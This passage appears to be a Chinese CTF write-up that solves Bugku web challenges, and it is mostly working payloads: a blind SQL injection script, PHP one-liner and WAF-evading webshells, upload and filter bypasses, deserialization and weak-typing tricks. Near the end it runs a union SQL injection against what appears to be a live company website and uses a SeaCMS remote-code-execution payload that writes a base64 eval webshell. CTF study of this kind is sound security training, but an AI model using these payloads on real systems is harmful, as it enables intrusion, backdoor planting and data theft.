table_schema='"+ database + "' limit 1 offset "+ str(i) +") " \ "from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1" table = get(payload) print( "数据库" + database + "的第"+ str(i+1) +"个表"+table) get_col(table) if not table: print('数据库'+database+'中的表查询完毕') break# 查字段def get_col(table): for i in range(0,5): print("正在查询表" + table + "中的字段") payload = "'+(select case when (substring((" \ "select column_name from information_schema.columns where table_name='"+ table +"' limit 1 offset "+ str(i) +") " \ "from &#123;0&#125; for 1)='&#123;1&#125;') " \ "then sleep(4) else 1 end) and '1'='1" column = get(payload) print("表" + table + "的第" + str(i+1) + "个字段为" + column ) # print(column) if not column: print("表" + table + "中的字段查询完毕") break# # 作为单独的模块使用吧,获取字段详细信息# def result(column,table):# payload = "'+(select case when (substring((select "+column+" from "+table+") from &#123;0&#125; for 1)='&#123;1&#125;') " \# "then sleep(4) else 1 end) and '1'='1"# print(get(payload))# a = 'flag'# result(a,a)if __name__ == "__main__": database1 = get(cur_database) table1 = get_table(database1) 最后使用上面被注释掉的那个模块，获取flag：flag{cdbf14c9551d5be5612f7bb5d2867853} sql2 题示信息： hint：全都tm过滤了绝望吗？ 提示 !,!=,=,+,-,^,%这题当时我用brup爆破被过滤的字符也注了很久，sqlmap也跑了就是跑不出上面长度370的是都被过滤了的。后来还是放弃了，去看了下wp，发现还是我太天真了，是.DS_Store源码泄露题。 .DS_Store文件泄露利用简介DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄露，特别是备份文件、源代码文件 .DS_Store文件泄露利用这里使用ds_store_exp脚本利用。 1python ds_store_exp.py 120.24.86.145:8007/web2/.DS_Store 效果： 当然在这之前需要：使用工具nikto对该网页进行扫描，可以发现/web2/子目录下有.DS_Store文件泄露的漏洞 备份是个好习惯这里推荐一个CTF中常见的源码泄露利用工具，其实就是一个爆破字典拿到一个index.php.bak 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125;?&gt; 弱类型数组绕过：1http://120.24.86.145:8002/web16/index.php?kekeyy1[]=0&amp;kkeyey2[]=a Flag:Bugku{OH_YOU_FIND_MY_MOMY} 求getshell文件上传题：初步认定，黑名单+content-type验证，上传.htaccess可以成功但是会被改名图片马也上了，没地方包含…感觉题目有点奇怪。。看了wp之后 改的是表单提交的Content-Type: MUltipart/form-data 进行大小写绕过…. 文件包含2看源码：文件上传，传了个&lt;?php phpinfo()?&gt; 过滤了&lt;?，但是&lt;没过滤…..传了个一句话木马1&lt;script language=php&gt;eval($_POST['A'])&lt;/script&gt; 菜刀连不上，试试命令执行。123&lt;script language=php&gt; system("ls")&lt;/script&gt; 看到flag123&lt;script language=php&gt;system("cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt")&lt;/script&gt; SKCTF{uP104D_1nclud3_426fh8_is_Fun} 这是一个神奇的登陆框burp抓包分析，有回显的盲注，改一下上面那个脚本就行，这里直接导出数据包直接跑sqlmap1SQLmap.py -r &quot;path&quot; -p admin_name --dbs cookies欺骗题目地址：http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=这样访问进去：显示一行乱七八糟的字母filename后参数base64解密：keys.txt 这里就得想一下用这个方法看index.php，base64编码后http://120.24.86.145:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw这里还有一个lne参数，控制代码行数，用脚本把源码拿出来：12345678910# encoding:utf-8import requests,reline = 1while line &lt; 100: url = 'http://120.24.86.145:8002/web11/index.php?line='+str(line) +'&amp;filename=aW5kZXgucGhw' s = requests.session() responce = s.get(url) print(responce.text) line = line + 1 源码如下：1234567891011121314151617&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;$file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 伪造cookie ：margin=margin 访问：/web11/index.php?line=&amp;filename=a2V5cy5waHA 其中a2V5cy5waHA 是keys.php base64加密后的得到flag：&lt;?php $key=’KEY{key_keys}’; ?&gt; flag在index里面点一点链接，url变成了：1http://120.24.86.145:8005/post/index.php?file=show.php 这样应该就是php，包含了我们get输入的file参数。问题是他说flag在index.php，我怎么样都读不出。后来想到文件包含里面可以用PHP的filter来读php文件(不需要allow_url_include)：1file=php://filter/read=convert.base64-encode/resource=./index.php base64解密后：123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))&#123; echo "Oh no!"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; flag{edulcni_elif_lacol_si_siht} nerver give up看源码：1p.html被跳转了，View-source: 看源码 得到：123456789101112131415161718&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE="Javascript"&gt;&lt;!--var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; 解码后：1234567891011121314151617181920212223242526272829303132var Words ="&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; ";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')) //不区分大小写的，返回第一个.的位置 这里不能有“.”&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r'); //加上@屏蔽错误信息if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt;function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt; 关键的一段需要绕过的地方：1if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) eregi有%00截断的漏洞，$data参数在前面配合file_get_contents()函数，我们可以php://input传入：payload:12hello.php?id=%00&amp;a=php://input&amp;b=%0012345post_data：bugku is a nice plateform! flag{tHis_iS_THe_fLaG} SQL约束攻击 参考： http://www.freebuf.com/articles/web/124537.htmlSQL约束攻击：攻击者使用任意身份的登录的漏洞 12345678910111213141516171819202122&lt;?php// Checking whether a user with the same username exists$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT * FROM users WHERE username='$username'";$res = mysql_query($query, $database);if($res) &#123; if(mysql_num_rows($res) &gt; 0) &#123; // User exists, exit gracefully . . &#125; else &#123; // If not, only then insert a new entry $query = "INSERT INTO users(username, password) VALUES ('$username','$password')"; . . &#125;&#125; 验证登录信息的页面：1234567891011121314&lt;?php$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT username FROM users WHERE username='$username' AND password='$password' ";$res = mysql_query($query, $database);if($res) &#123; if(mysql_num_rows($res) &gt; 0)&#123; $row = mysql_fetch_assoc($res); return $row['username']; &#125;&#125;return Null; 原理：这里这行select语句：SELECT FROM users WHERE username=’vampire ‘;和这句的效果是一样的：SELECT FROM users WHERE username=’vampire’;SQL执行字符串处理时，字符串末尾的空格会被去除。 在insert查询中，SQL会根据varchar(n)来限制字符串的最大长度，也就是说大于n的话就只取前n个字符。 下面如果我们用”admin 1”和随便一个密码 来注册一个号子，对于注册界面的select语句，它并没有查到数据库中有该用户，所以成功绕过，运行到后面的insert语句的时候，只会插入前n个字符，所以当空格足够多的时候，相当于插入了一个”admin “接下来到登录的页面，用admin和之前随便输入的密码进行登录的时候，搜索该用户名SELECT查询都将返回第一个数据记录。这样的话就可以使用原始用户身份登录。 防御办法：将名字那列加上UNIQUE约束，使之不能插入另一条记录，检测到两个相同的字符串，并insert查询失败。 flag: SKCTF{4Dm1n_HaV3_GreAt_p0w3R} Web8 题示信息：txt？？？？123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo "&lt;p&gt;This is flag:" ." $flag&lt;/p&gt;";&#125;else&#123;echo "&lt;p&gt;sorry!&lt;/p&gt;";&#125;&#125;?&gt; extract($_GET)注册变量绕过办法：ac=aa&amp;f=php://inputdata=aa 后来还知道 访问flag.txt后出现flags (个人觉得，这种方法纯属取巧，很难知道目录下有flag.txt文件的）http://120.24.86.145:8002/web8/?ac=flags&amp;fn=flag.txt 其实不难发现，上面几个题都出现了file_get_contents函数，而且都和php伪协议有关，这意味着，以后碰到这个函数可以多往这个方面想想 welcome to bugku查看源码：1234567891011121314you are not the number of bugku ! &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 既然要用伪协议传入welcome to the bugkuctf，那么就可以用php://filter/convert.base64-encode/resource=hint.php读出hint.php（直接读是读不出来的） 得到：1PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA== base64解码后：123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; __tostring：字符操作时触发()。用这种伪协议读文件的方法的时候：一定要想着多看几个文件,像index.php(robots.txt) 不能漏12345678910111213141516171819202122http://120.24.86.145:8006/test1/txt=php://input&amp;file=php://filter/convert.base64-encode/resource=index.php&amp;password=123&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; echo $password 会触发__tostring所以file参数写包含hint.php，txt还是之前的伪协议不变，password就用以下脚本传入flag.php，序列化的数据12345678910111213141516&lt;?phpclass Flag&#123; public $file = 'Flag.php'; public function __tostring() &#123; if (isset($this-&gt;file)) &#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125;&#125;$a = new Flag();echo serialize($a);?&gt; password = O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} payload:12http://120.24.86.145:8006/test1/?txt=php://input&amp;file=php://filter/convert.base64-encode/resource=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;data：welcome to the bugkuctf 拿到flagflag{php_is_the_best_language} 本地包含题目源码：123456&lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__);?&gt; 使用?hello=file(‘flag.php’)或者?hello=show_source(‘flag.php’) 等可以读取源码的函数或者构造var_dump($a) 闭合 成绩单过滤了–+，已判断字段4个1id=-2&apos; union select 1,2,3,database() # 查出数据库：skctf_flag1id=-2&apos; union select 1,2,3,table_name from information_schema.tables where table_schema=&apos;skctf_flag&apos; # 查出表：fl4g1id=-2&apos; union select 1,2,3,column_name from information_schema.columns where table_name=&apos;fl4g&apos; # 查出字段skctf_flag1id=-2&apos; union select 1,2,skctf_flag,4 from skctf_flag.fl4g # 查出flag：BUGKU{Sql_INJECT0N_4813drd8hz4} 各种绕过源码：12345678910111213141516171819 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 两个不相等的值，但sha1相等：一样用数组绕过即可获得flag 过狗一句话题示信息：送给大家一个过狗一句话1&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 1http://120.24.86.145:8010/index.php?s=phpinfo() 执行成功 但是菜刀连不上，估计是限制了权限。试了n久之后，看了wp用的print_r(glob(‘*.php’));读取敏感文件1Array ( [0] =&gt; 2.php [1] =&gt; 3.php [2] =&gt; 4.php [3] =&gt; 5.php [4] =&gt; a.php [5] =&gt; c.php [6] =&gt; chaoba1.php [7] =&gt; chaoba2.php [8] =&gt; ddee.php [9] =&gt; f.php [10] =&gt; h.php [11] =&gt; haha.php [12] =&gt; index.php [13] =&gt; ll.php [14] =&gt; oudeniu.php [15] =&gt; phpspy1.php [16] =&gt; q.php [17] =&gt; t2.php [18] =&gt; txxxc.php [19] =&gt; x.php [20] =&gt; xxoo.php [21] =&gt; xxoos.php [22] =&gt; zx.php ) 尝试：print_r(glob(‘*.txt’))1Array ( [0] =&gt; NewFile.txt [1] =&gt; a.txt [2] =&gt; flag.txt [3] =&gt; testfile.txt ) 尝试：print_r(file(“./flag.txt”))1Array ( [0] =&gt; BUGKU&#123;bugku_web_009801_a&#125; ) 前女友123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; v1和v2比：数组绕过v3 strcmp()绕过：用数组即可1payload： http://118.89.219.210:49162/?v1[]=123&amp;v2[]=ads&amp;v3[]=123 flag：SKCTF{Php_1s_tH3_B3St_L4NgUag3} 秋名山老司机算术题，刷新一次变一次，多刷新几次会发现：让我们把答案在2秒内以value为参数post上去：12345678910111213# encoding:utf-8import requests,reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()responce = s.get(url)final = re.findall(r'&lt;div&gt;(.+?)=',responce.text)result = eval(final[0])data = &#123; "value": str(result)&#125;responce2 = s.post(url,data=data)print(responce2.text) 这里有个坑：一定要开session，不然他会以为你是不同电脑发来的 速度要快抓到返回headers 里面有base64加密的flagbase64解密后，发现flag部分还有一次base641234567891011121314151617# encoding:utf-8import requests,base64,reurl = 'http://120.24.86.145:8002/web6/'s = requests.session()responce = s.get(url)f = responce.headers['flag']f = base64.b64decode(f)print(f)flag = re.findall(r':(.+?)\'',str(f))[0].strip()data = &#123; 'margin': base64.b64decode(flag)&#125;print(flag)responce2 = s.post(url,data=data)print(responce2.text) Trim的日记本一想到这种题肯定考二次，但是扫了一下目录得到show.php，访问就拿到flag了。这个题没找到回显的点，不知道这个题是考察什么… 变量覆盖源码12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; 解法1：12http://120.24.86.145:9009/1.php?shiyan=123&amp;flag=php://inputpost_data:123 解法21http://120.24.86.145:9009/1.php?shiyan=&amp;flag= flag{bugku-dmsj-p2sm3N}但是为什么赋1就不相等呢？1http://120.24.86.145:9009/1.php?shiyan=1&amp;flag=1 后来在本地测了一下，因为file_get_contents($flag)始终是包含不到文件的，所以会返回一个空，此时只有当shiyan参数也为空才能相等。demo:12345678910111213141516171819202122232425&lt;?php$flag='123';extract($_GET);if(isset($shiyan))&#123; $content=trim(file_get_contents($flag1)); if($shiyan==$content) &#123; echo 'bingo'; echo '&lt;br&gt;'; var_dump($flag); echo '&lt;br&gt;'; var_dump($content); echo '&lt;br&gt;'; var_dump($shiyan); &#125; else &#123; var_dump($flag.'&lt;br&gt;'); var_dump($content.'&lt;br&gt;'); var_dump($shiyan.'&lt;br&gt;'); echo'Oh.no'; &#125;&#125;?&gt; strcmp比较字符串12345678910&lt;?php$flag = "flag&#123;xxxxx&#125;";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。//比较两个字符串（区分大小写）die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 数组绕过：1http://120.24.86.145:9009/6.php?a[]=1 Flag: flag{bugku_dmsj_912k} urldecode二次编码绕过123456789101112131415161718192021&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123;echo("not allowed!");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123;echo "Access granted!";echo "flag";&#125;?&gt; 因为浏览器解析一次php解析一次，所以要两次编码：1http://120.24.86.145:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61 flag{bugku__daimasj-1t2} 数组返回NULL绕过123456789101112&lt;?php$flag = "flag";if (isset ($_GET['password'])) &#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; ereg()函数匹配数组的时候会返回null，所以：1http://120.24.86.145:9009/19.php?password[]=1-- flag{ctf-bugku-ad-2131212} 弱类型整数大小比较绕过题示源码：1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; 要求我们传入的password参数不能为数字，且要大于1336。我们可以在本地测试一下，is_numeric()函数可以被数组绕过，而且该数组可以和数字进行大小比较：1234567891011121314&lt;?php$temp = $_POST['passer6y'];if(is_numeric($temp)) &#123; echo "is num&lt;br&gt;"; var_dump($temp);&#125;else&#123; echo "is not num&lt;br&gt;"; var_dump($temp); if($temp &gt; 10)&#123; echo "&lt;br&gt;\$temp &gt; 10"; &#125;&#125;?&gt; 所以我们可以，构造payload：1http://120.24.86.145:9009/22.php?password[]=asdsadsadasd 得到flag：flag{bugku_null_numeric} sha()函数比较绕过12345678910111213141516171819&lt;?php$flag = "flag";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo "";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'invalid password';&#125;elseecho 'ogin first!';?&gt; 这个题目要求我们传入name和password参数不相等，但他们的sha1()加密后相等我们可以本地测试一下如果sha1()函数加密一个数组返回的会是怎样：1234&lt;?php$a = $_POST['passer6y'];var_dump(sha1($a));?&gt; 会发出一个警告，说sha1()希望参数是string类型，但如果我们传入一个数组类型，返回的是NULL，因此此题我们可以构造payload：1http://120.24.86.145:9009/7.php?name[]=123&amp;password[]=a 得到：flag{bugku–daimasj-a2} ps：sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 十六进制与数字比较题示源码：12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord — 返回字符的 ASCII 码值$nine = ord('9'); //ord — 返回字符的 ASCII 码值$number = '3735929054';// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return "flase";&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 这个题的意思就是说，不能输入1-9的数字，但是最后结果是要和 ‘3735929054’相等，很容易想到用16进制绕过。payload：1http://120.24.86.145:9009/20.php?password=0xDEADC0DE ereg正则%00截断题示源码：12345678910111213141516171819202122232425&lt;?php$flag = "xxx";if (isset ($_GET['password']))&#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeri';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)&#123;if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo ’Invalid password';&#125;&#125;?&gt; 这个题要求我们传入的password变量，绕过ereg()变量，长度小于8且数值大于9999999，还要有”-“符号。我们可以用%00来绕过ereg()变量，用数组绕过strlen()来限制我们的数字位数,paylaod如下1http://120.24.86.145:9009/5.php?password[]=%00999999999- get flag：flag{bugku-dm-sj-a12JH8}我在本地测数组绕过strlen()的长度限制,不论我传入的数组是什么值，都显示长度为5： 1234&lt;?php$a = $_POST['passer6y'];var_dump(strlen($a));?&gt; strpos数组绕过题示源码：1234567891011&lt;?php$flag = "flag";if (isset ($_GET['ctf'])) &#123;if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)echo '必须输入数字才行';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho '骚年，继续努力吧啊~';&#125;?&gt; strpos()函数和ereg()函数一样也具有数组绕过漏洞paylaod:1http://120.24.86.145:9009/15.php?ctf[]=123asd 数字验证正则绕过题示源码：12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if ("POST" == $_SERVER['REQUEST_METHOD'])&#123;$password = $_POST['password'];if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) //preg_match — 执行一个正则表达式匹配&#123;echo 'flag';exit;&#125;while (TRUE)&#123;$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';if (6 &gt; preg_match_all($reg, $password, $arr))break;$c = 0;$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123;if (preg_match("/[[:$pt:]]+/", $password))$c += 1;&#125;if ($c &lt; 3) break;//&gt;=3，必须包含四种类型三种与三种以上if ("42" == $password) echo $flag;else echo 'Wrong password';exit;&#125;&#125;?&gt; 从第7行代码我们可以知道，除了空白字符和制表符外不能超过12个字符，还有第9行那个1echo 'flag'; 这个是个字符串flag，真正的flag在26行处。第15行处，12$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) 要求我们传入的参数中，标点，数字，大写小写字母被匹配的次数大于6。12345678$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match("/[[:$pt:]]+/", $password)) $c += 1; &#125; if ($c &lt; 3) break;if ("42" == $password) echo $flag; 同时要求我们包含这几种类型至少三种以上，且使password参数和42相等payload:1password=42.00e+0000000000 flag{Bugku_preg_match} flag.php 提示信息：点了login咋没反应，提示：hint这题有毒，提示hint，竟然是以hint为参数，随便传入一个值即可获得源码：1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once("flag.php");$cookie = $_COOKIE['ISecer'];if(isset($_GET['hint']))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === "$KEY")&#123; echo "$flag";&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel="stylesheet" href="admin.css" type="text/css"&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class="container" align="center"&gt; &lt;form method="POST" action="#"&gt; &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY='ISecer:www.isecer.com';?&gt; 一开始，我把反序列化数据,然后按照1s:21:&quot;ISecer:www.isecer.com&quot;; 传了上去，感觉智商再次被侮辱..这个$key变量的值是后面才传入的，所以我们应该传个空的反序列化数据： 实战2-打开页面，既然题目说了，那就找，点了一遍，发现一个http://www.kabelindo.co.id/readnews.php?id=18顺手一个单引号，诶报错了,那就来123456http://www.kabelindo.co.id/readnews.php?id=18 order by 5 --+ http://www.kabelindo.co.id/readnews.php?id=18 select 1,2,3,4,5 --+http://www.kabelindo.co.id/readnews.php?id=18select 1,version(),database(),4,5 --+http://www.kabelindo.co.id/readnews.php?id=18select 1,2,table_name,4,5 from information_schema.tables --+ 表名出来了，flag{tbnomax} Bugku-cms1打开页面，往下一拉，Powered by SongCMS v3.13 免费版日常扫目录，发现一个/data/，打开一看有个sql文件，里面有两个账号密码，分别试了一下，进了后台，找下上传文件的地方然后上传成功，菜刀一连，flag就在根目录下 phpcmsV9照着漏洞来就行了http://www.freebuf.com/vuls/131648.html 海洋cms个人觉得，这些题考察exp快速搜索能力参考：https://blog.csdn.net/qq_35078631/article/details/76595817 123http://120.24.86.145:8008/search.php?searchtype=5searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=fwrite(fopen(&quot;pass.php&quot;,&quot;w&quot;),base64_decode(PD9waHAgZXZhbCgkX1BPU1Rbc3d4XSk7Pz4)) 然后菜刀连接： 